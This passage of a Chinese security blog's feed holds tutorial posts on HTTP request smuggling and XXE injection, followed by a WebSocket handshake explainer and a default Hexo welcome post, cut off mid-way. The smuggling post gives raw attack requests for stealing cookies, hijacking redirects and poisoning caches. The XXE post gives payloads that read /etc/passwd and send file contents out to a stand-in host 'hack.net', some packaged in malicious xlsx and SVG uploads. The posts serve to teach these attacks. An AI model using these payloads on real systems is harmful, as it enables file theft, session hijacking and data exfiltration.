xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 11</span><br><span class="line"></span><br><span class="line">q=something</span><br></pre></td></tr></table></figure><p>这就导致了后续对 <code>/search</code> 的访问，因为请求行被吃进了 <code>X-Ignore</code> 这个请求头的值中，拼接后实际变成了对 <code>/404</code> 的访问。</p><p>从理论上来说，我们可以发出请求走私攻击包后，紧接着发送一个正常请求，根据后者不正常的响应差异来判断漏洞存在。</p><p>在实战中我们的攻击请求和紧接着发送的正常请求之间，很可能会有其他人的某个请求刚好插在了中间，这样我们本来期待用于判断漏洞的不正常响应就会被回复给别人，影响别人正常使的同时还会导致我们误以为没洞，所以最好避开高峰期多试几次。</p><ul><li>或者<a href="https://portswigger.net/web-security/request-smuggling/finding">基于响应时间来判断</a></li></ul><h2 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-length</span>: 13</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line">q=something</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/404</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line"><span class="attribute">0</span></span><br></pre></td></tr></table></figure><ol start="0"><li><p>前端以 <code>TE</code> 作为界定标准，会将这一整段视为一个请求转发至后端( <code>q=something</code> 及之后的部分会被认作是该请求的请求体内容)</p></li><li><p>前端读取 <code>CL</code> 值为13，认为第一个请求截止到 <code>q=something</code>，将后续部分视作下一个传输过来的请求</p></li><li><p>由于我们构造的后面这个请求的 <code>CL</code> 值为15，所以后端认为这份数据还没有接收完毕，会继续在随后到来的请求中取出5个字符拼接进去</p></li><li><p>后端随后紧接而来的请求实际上会被拼接成这种样子：</p></li></ol><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/404</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">POST[空格]</span></span><br></pre></td></tr></table></figure><p>于是就使得后续请求被截断，剩下的不完整部分会被视为无效请求丢弃，最终会得到一个不正常的响应。（同样存在前文中说的竞争问题，缓解方法一样）</p><h2 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h2><p>从原理来看前后端标准一致时是不存在请求走私的，但如果一个接受畸形 <code>TE</code> 认为是分块传输，一个不接受畸形 <code>TE</code> 而按照 <code>CL</code> 的值作为请求结束界定标准，这种细微差异同样会导致请求走私，PortSwigger 提供了部分在实战中成功利用过的畸形头：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding</span>: xchunked</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding : chunked</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: x</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding:[tab]chunked</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X</span>: X[\n]Transfer-Encoding: chunked</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding</span></span><br><span class="line"><span class="attribute"></span>: chunked</span><br></pre></td></tr></table></figure><ul><li>在<a href="https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646">Burp插件</a>中存在更多畸形 <code>TE</code> 头用于Fuzz，可以自动计算 <code>CL</code> 长度和配合 <code>Turbo Intruder</code> 光速发包，真香</li></ul><p>利用畸形 <code>TE</code> 导致的差异化解析，最终还是会对应 <code>CL-TE</code> 或 <code>TE-CL</code> 的情况，就不再贴数据包了(就是改一下 <code>TE</code> 头)。</p><h2 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h2><p>最直接的就是用来绕过前端的安全访问控制，让走私的请求直达业务逻辑后端。但是实战中可能没有这么理想化，比如后端还是会校验 <code>client-ip</code> 、 <code>x-forwarded-for</code> 或是反代加的自定义请求头，这时就需要找到一个能够回显请求体参数的地方，利用请求走私中的第二个 <code>不完整</code> 请求吃掉紧接而来的下一个请求，通过直接或间接的回显读到需要的请求头。</p><p>比如在一个搜索功能中，POST请求的 <code>q</code> 参数的内容表示搜索的字符串，这个字符串在搜索页会被 <code>直接回显</code> 或是存储到搜索记录中 <code>间接回显</code>。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 159</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">POST /admin HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 200</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">a=x&amp;b=y&amp;c=z&amp;q=something</span><br></pre></td></tr></table></figure><p>重点注意第二个走私请求中 <code>CL</code> 值被设置得偏大，且有回显的 <code>q</code> 参数被移到了末尾，后端随后紧接而来的请求实际上会被拼接成这种样子：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 100</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">a=x&amp;b=y&amp;c=z&amp;q=somethingPOST /search HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xx.net</span><br><span class="line"><span class="attribute">X-Secret-Header</span>: 666</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><code>...</code>中有多少内容取决于走私请求中 <code>CL</code> 值的大小，建议根据需要慢慢调大，避免过大导致超时(在这个例子中我们已经读到了需要的 <code>X-Secret-Header: 666</code> 这个前端服务器自定义校验头)，但是调大 <code>CL</code> 值能读到的东西最多截止到遇到 <code>&amp;</code> 时（想想HTTP请求用什么符号区分不同参数？我们能回显什么参数？）</p><p>至于这个 <code>随后紧接而来的请求</code> 该由我们发出，还是守株待兔等着别人的访问请求进坑，就要看具体的目的是什<br>么了。</p><h3 id="窃取Cookie"><a href="#窃取Cookie" class="headerlink" title="窃取Cookie"></a>窃取Cookie</h3><p>如果是想要打到别人的私有请求头(比如 <code>Cookie</code> 之类的)，那就得等人进坑且需要一个存储型的间接回显点，因为一次性的直接回显会直接响应给受害者，我们是看不到的。</p><ul><li>存储型间接回显点举例:搜索记录、个人简介、发布文章、发布评论、发送私信</li></ul><h3 id="水坑型XSS"><a href="#水坑型XSS" class="headerlink" title="水坑型XSS"></a>水坑型XSS</h3><p>如果实在没有存储型间接回显点的话，那就充分利用一次性直接回显这个特点，配合一个反射型XSS使其变为无条件触发的 <code>水坑型XSS</code> （我自己编的名）</p><ul><li>反射型XSS漏洞点可以是常规的GET或POST参数，同样也可以是像 <code>User-Agent</code> 头这种self触发点，因为结合请求走私我们可以实现将它强加给下一个访问的受害者</li></ul><h3 id="任意重定向"><a href="#任意重定向" class="headerlink" title="任意重定向"></a>任意重定向</h3><p>如果配合 <code>Apache</code> 和 <code>IIS</code> 会将无斜杠路径通过重定向方式添加斜杠的特性，就可以再次利用请求走私给下一个访问的受害者强加头部，通过重定向将其劫持到任意域名下。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 54</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /evil HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: hack.net</span><br><span class="line"><span class="attribute">X-Ignore</span>: eat</span><br></pre></td></tr></table></figure><p>下一个受害者的访问请求会被拼接成这种样子:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/evil</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: hack.net</span><br><span class="line"><span class="attribute">X-Ignore</span>: eatPOST /a.js HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="number">301</span> Moved Permanently</span><br><span class="line"><span class="attribute">Location</span>: https://hack.net/evil/</span><br></pre></td></tr></table></figure><h3 id="Web缓存投毒"><a href="#Web缓存投毒" class="headerlink" title="Web缓存投毒"></a>Web缓存投毒</h3><p>同时，对于 <code>/a.js</code> 的访问请求还可能被缓存下来，使得之后每个不受请求走私影响的后续请求，同样受到重定向劫持的影响，进一步造成Web缓存投毒：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/a.js</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="number">301</span> Moved Permanently</span><br><span class="line"><span class="attribute">Location</span>: https://hack.net/evil/</span><br></pre></td></tr></table></figure><h3 id="Web缓存水坑"><a href="#Web缓存水坑" class="headerlink" title="Web缓存水坑"></a>Web缓存水坑</h3><p>回过头来，之前没找到回显点打敏感数据的话，也可以再再次利用请求走私给下一个访问的受害者强加头部，结合Web缓存特性将其敏感数据缓存下来窃取。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 43</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /getapikey HTTP/1.1</span><br><span class="line"><span class="attribute">X-Ignore</span>: eat</span><br></pre></td></tr></table></figure><p>下一个受害者的访问请求会被拼接成这种样子:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/getapikey</span> HTTP/1.1</span><br><span class="line"><span class="attribute">X-Ignore</span>: eatPOST /any.js HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line"><span class="attribute">Cookie</span>: sessionId=balabalabala</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>受害者的 <code>/getapikey</code> 中的信息会被缓存至 <code>/any.js</code> 中，但是一个问题是攻击者并不知道受害者是访问的 <code>/any.js</code>，所以可能需要遍历几乎所有静态文件分析= =</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;聊HTTP请求走私之前，需要先思考一个问题：HTTP请求如何标识一个请求的结束（尤其是POST请求）&lt;/p&gt;
&lt;p&gt;一种是通过 &lt;code&gt;Content-Length&lt;/code&gt; 请求头 的值界定请求体的长度，另一种是在&lt;a href=&quot;https://zh.wikip</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="smuggling" scheme="https://hosch3n.github.io/tags/smuggling/"/>
    
  </entry>
  
  <entry>
    <title>XML基础与XXE注入</title>
    <link href="https://hosch3n.github.io/2020/08/16/XML%E5%9F%BA%E7%A1%80%E4%B8%8EXXE%E6%B3%A8%E5%85%A5/"/>
    <id>https://hosch3n.github.io/2020/08/16/XML%E5%9F%BA%E7%A1%80%E4%B8%8EXXE%E6%B3%A8%E5%85%A5/</id>
    <published>2020-08-16T13:32:00.000Z</published>
    <updated>2020-09-09T18:22:20.836Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h2><p>XML是一种被设计用来存储和传输数据的语言，叫作<em>可扩展标记语言</em>，通过自定义标签的形式描述数据。</p><h3 id="XML实体"><a href="#XML实体" class="headerlink" title="XML实体"></a>XML实体</h3><p>为了区分开表示数据的尖括号和表示结构的标签，在数据中用<code>&amp;lt;</code>和<code>&amp;gt;</code>这类预定义的XML实体来表示左右尖括号。</p><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>XML通过头部的DTD（文档类型定义）来定义文档结构，实际内容直接写在文档里的DTD叫作<code>内部DTD</code>，实际内容放在外面，要通过引用加载的DTD叫作<code>外部DTD</code>，二者可以在XML中混用。</p><h3 id="自定义实体"><a href="#自定义实体" class="headerlink" title="自定义实体"></a>自定义实体</h3><p>如果预定义的XML实体不够用，就可以自定义新的XML实体：</p><p><code>&lt;!DOCTYPE test [ &lt;!ENTITY id &quot;hosch3n&quot; &gt; ]&gt;</code></p><p>这样就可以用<code>&amp;id;</code>表示<code>hosch3n</code>这个值。</p><h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><p>自定义实体的实际内容不一定要写在DTD里，也可以写在外面然后通过引用加载：</p><p><code>&lt;!DOCTYPE test [ &lt;!ENTITY ext SYSTEM &quot;http://xxx.com&quot; &gt; ]&gt;</code></p><ul><li>支持http、ftp、file等协议</li></ul><h2 id="XXE注入"><a href="#XXE注入" class="headerlink" title="XXE注入"></a>XXE注入</h2><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">&amp;xxe;</span></span><br></pre></td></tr></table></figure><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1/&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">&amp;xxe;</span></span><br></pre></td></tr></table></figure><h3 id="OAST"><a href="#OAST" class="headerlink" title="OAST"></a>OAST</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http:&#x2F;&#x2F;hack.net&#x2F;?x&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [<span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&quot;http://hack.net/hack.dtd&quot;</span>&gt;</span> %xxe;]&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XInclude"><a href="#XInclude" class="headerlink" title="XInclude"></a>XInclude</h3><ul><li>数据在服务器端拼接进XML文档</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">test</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span> <span class="attr">href</span>=<span class="string">&quot;file:///etc/passwd&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Apache-POI"><a href="#Apache-POI" class="headerlink" title="Apache POI"></a>Apache POI</h3><ul><li>文件上传xlsx文档</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># xxe.dtd</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://hack.net/?%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># [Content_Types].xml</span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://hack.net/xxe.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ZIP压缩后改后缀为<code>xlsx</code></p><h3 id="Apache-Batik"><a href="#Apache-Batik" class="headerlink" title="Apache Batik"></a>Apache Batik</h3><ul><li>文件上传SVG头像</li></ul><figure class="highlight svg"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/hostname&quot;</span> &gt;</span> ]&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;128px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;128px&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text</span> <span class="attr">font-size</span>=<span class="string">&quot;16&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;16&quot;</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;XML基础&quot;&gt;&lt;a href=&quot;#XML基础&quot; class=&quot;headerlink&quot; title=&quot;XML基础&quot;&gt;&lt;/a&gt;XML基础&lt;/h2&gt;&lt;p&gt;XML是一种被设计用来存储和传输数据的语言，叫作&lt;em&gt;可扩展标记语言&lt;/em&gt;，通过自定义标签的形式描述数据。&lt;/</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="XML" scheme="https://hosch3n.github.io/tags/XML/"/>
    
    <category term="XXE" scheme="https://hosch3n.github.io/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>建立WebSocket连接</title>
    <link href="https://hosch3n.github.io/2020/08/16/%E5%BB%BA%E7%AB%8BWebSocket%E8%BF%9E%E6%8E%A5/"/>
    <id>https://hosch3n.github.io/2020/08/16/%E5%BB%BA%E7%AB%8BWebSocket%E8%BF%9E%E6%8E%A5/</id>
    <published>2020-08-16T12:33:06.000Z</published>
    <updated>2020-09-24T16:14:02.816Z</updated>
    
    <content type="html"><![CDATA[<p>WebSocket是一种双向全双工的应用层协议，通常用在要求低延迟或需要服务器主动发送请求的地方。WSS与WS就像HTTPS与HTTP的关系一样，多了TLS加密层。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">&quot;wss://xxx.com/func&quot;</span>);</span><br></pre></td></tr></table></figure><p>首次建立WS连接时会通过HTTP协议握手协商：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/func</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.com</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive, Upgrade</span><br><span class="line"><span class="attribute">Upgrade</span>: websocket</span><br><span class="line"><span class="attribute">Sec-WebSocket-Version</span>: 13</span><br><span class="line"><span class="attribute">Sec-WebSocket-Key</span>: QKVMhgEVGz7jTFD5PIizrQ==</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="number">101</span> Switching Protocol</span><br><span class="line"><span class="attribute">Connection</span>: Upgrade</span><br><span class="line"><span class="attribute">Upgrade</span>: websocket</span><br><span class="line"><span class="attribute">Sec-WebSocket-Accept</span>: GUgfO45/U2Oo5uUkpUR3jnm3zcA=</span><br><span class="line"><span class="attribute">Content-Length</span>: 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>Connection</code>与<code>Upgrade</code>表明这是WS握手，<code>Sec-WebSocket-Version</code>表示客户端希望使用的版本，<code>Sec-WebSocket-Key</code>为随机产生的Base64编码，<code>Sec-WebSocket-Accept</code>会响应该随机值的哈希。</p><p>握手成功后便可基于WS协议传输任意格式的数据，常用JSON：<code>ws.send(&#123;&quot;a&quot;: 1&#125;);</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;WebSocket是一种双向全双工的应用层协议，通常用在要求低延迟或需要服务器主动发送请求的地方。WSS与WS就像HTTPS与HTTP的关系一样，多了TLS加密层。&lt;/p&gt;
&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="WS" scheme="https://hosch3n.github.io/tags/WS/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://hosch3n.github.io/2020/08/16/hello-world/"/>
    <id>https://hosch3n.github.io/2020/08/16/hello-world/</id>
    <published>2020-08-16T09:58:12.920Z</published>
    <updated>2020-08-16T12:26:28.540Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a 